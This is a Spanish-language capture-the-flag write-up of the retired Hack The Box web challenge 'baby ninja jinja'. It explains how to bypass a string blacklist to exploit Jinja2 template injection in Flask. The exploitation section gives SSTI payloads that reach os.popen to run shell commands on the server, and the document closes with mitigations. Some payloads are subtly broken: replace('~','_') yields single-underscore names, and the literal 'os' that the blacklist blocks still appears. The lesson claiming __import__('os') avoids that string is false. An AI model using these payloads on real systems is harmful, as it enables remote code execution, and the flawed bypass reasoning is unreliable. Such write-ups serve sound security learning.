---
challenge: baby ninja jinja
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, flask, jinja2, ssti, blacklist-bypass]
---

# baby ninja jinja — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Reto resuelto; sin flags reales.

## TL;DR

Mismo terreno que un SSTI de Jinja2, pero con una **blacklist** que bloquea `{{ }}`, `_`, `.` y palabras como `os` o `config`. Se sale con `{% print %}` para evitar las llaves dobles, el filtro `attr` para sustituir el punto y `request.application` para llegar a los globals sin escribir `__globals__` literal.

## Enunciado y superficie

Un buscador que refleja lo que escribes. `{{7*7}}` devuelve error o el texto tal cual: hay filtro. El nombre del reto ya dice qué tecnología hay detrás.

## Reconocimiento

- Un buscador que refleja el término sin escapar. `{{7*7}}` no devuelve `49`: hay una **blacklist** que bloquea `{{`, `}}`, `_`, `.`, `os` y `config`.
- El nombre del reto confirma Jinja2 en Flask; el servidor devuelve la plantilla renderizada desde `render_template_string`.
- La lista negra es la única defensa: no hay sandbox ni `SandboxedEnvironment`.

## Análisis del código

- `{% print 7*7 %}` sí funciona: la blacklist solo cubre las llaves dobles, no las sentencias.
- Sin `.` se usa el filtro `attr` (`''|attr('__class__')`), y sin `_` se recurre a `request.application` para llegar a los globals.
- Con `attr` y `request.application.__globals__` se alcanza `os.popen` sin escribir los nombres prohibidos.

## Explicación del fallo

La app hace algo como:

```python
blacklist = ["{{", "}}", "_", ".", "os", "config", "class", "mro"]
if any(b in name for b in blacklist):
    return "no"
return render_template_string(name)
```

Como no bloquea `{% %}`, la sentencia de impresión sigue disponible; y como `attr` es un filtro de Jinja2, sustituye al acceso por punto.

## Reproducción local

- Levanta la misma versión del servicio en un contenedor y apunta el exploit a `127.0.0.1`.

## Explotación

```text
{%print(7*7)%}
```

Confirma ejecución. Para llegar a `os` sin escribir ni `_` ni `.` ni `os`:

```text
{%print(request|attr('application')|attr('~globals~'|replace('~','_'))|attr('~builtins~'|replace('~','_'))|attr('~import~'|replace('~','_'))('os')|attr('popen')('cat /flag*')|attr('read')())%}
```

Más corto si solo se filtra `{{`/`}}`:

```text
{%print(request.application.__globals__.__builtins__.__import__('os').popen('cat /flag*').read())%}
```

Alternativa con `cycler`, que casi nunca está en la lista:

```text
{%print(cycler|attr('~init~'|replace('~','_'))|attr('~globals~'|replace('~','_'))|attr('os')|attr('popen')('cat /flag*')|attr('read')())%}
```

```text
HTB{<flag>}
```

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **`print` con paréntesis**: en Jinja2 `{%print x%}` funciona sin paréntesis; con ellos también en la mayoría de versiones.
- **Comillas y `_`**: `replace('~','_')` reconstruye el nombre del atributo sin escribirlo.
- **`os` bloqueado**: importar el módulo por `__import__('os')` evita la cadena literal.

- Las blacklists de cadenas se esquivan con filtros y concatenación; el SSTI se cierra con sandbox, no con listas negras.
- `{% %}` y `attr` son las dos primeras cosas que se prueban cuando `{{ }}` y `.` están filtrados.
- Mitigación: `SandboxedEnvironment`, variables en vez de plantillas dinámicas, y WAF como capa extra.

## Mitigaciones y detección

- No construir plantillas con entrada del usuario; usar sandbox y contexto restringido.

## Referencias

- [ssti](../../knowledge/web/ssti.md)
